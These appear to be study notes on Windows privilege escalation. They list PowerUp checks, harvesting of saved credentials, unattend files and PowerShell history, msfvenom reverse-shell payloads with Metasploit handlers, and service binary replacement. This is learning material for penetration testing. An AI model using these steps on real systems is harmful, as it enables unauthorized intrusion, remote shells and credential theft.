# PrivEsc

### PowerUp

PowerUp is populor tool used in context of Windows privilege escalation.
- Part of PowerSploit framework
- Automate the process of scanning a Windows system for potential misconfigurations, vulns that could lead to privilege escalation.

**Steps**:
- Get access and get [Powersploit](https://github.com/PowerShellMafia/PowerSploit) on victim machine
- `powershell -ep bypass`
- Import module PowerSploit `Import-Module PowerSploit` or `Import-Module .\PowerSploit`
    - `Get-Command -Module PowerSploit` Get available module
- Run `Invoke-privescAudit` Check potential exploit for privilege
- `Get-UnquotedService` check for unquoted service paths which could potentially allow for privilege escalation
- `Get-ModifiableService` check for the services that the current user can modify

### Unattend installation file
- Some service can leave config file after installation (like Unattended Windows Setup)
  - `C:\Windows\Panther\Unattend.xml`
  - `C:\Windows\Panther\Autounattend.xml`

Check the system is contain those file, and extract infomation from that.

### Windows Credential Manager

Windows Credential Manager is a built in feature in Microsoft Windows that allow users to securely store and manage credential

`cmdkey` is a command line utility in Windows that interact with Windows Credential Manager. With `cmdkey` you can:
- Add Credential
- List Credential
- Delete Credential

**Steps**:
- Start `powershell` -> `cmdkey /list` ~ List save cred that we can use.
- `runas.exe /savecred /user:administrator cmd` Use save credential, no need to input password

For remote control:
- `msfvenom -p windows/x64/.../reverse_tcp ... -f exe -o shell.exe`
- Use module `web_delivery` -> Set up host and port and payload like msfvenom -> Run -> Set the powershell command
- Run powershell command on victim machine
- Upload the `shell.exe`
- Set up `multi/handler` and run `shell.exe`

### Powershell history

- Check the history with first, apply `show hidden file`
- Goto user folder `AppData/Roaming/Microsoft/Windows/Powershell/PSReadline` 
- Open the `ConsoleHost_History` File with notepad

### Insecure Service Permissions

We can use tool like powerUp, AccessChk to automate check. When Identified the vuls service, Attacker modify the service config and restart the service

Attack vector:
- Service Binary Replacement
- Unquoted Service Path Exploitation
- DLL Hijacking in Services
- Weak Permissions on Service Configuration (Registry)
- Service Permission Manipulation
- Insecure Service Restart Behavior
- Path Interception (Environment Variables)

**Steps**:
- Use `msfvenom -p windows/meterpreter/reverse_tcp .... -f exe > "FileZilla Server.exe"` to generate payload
- Setup the `multi/handler`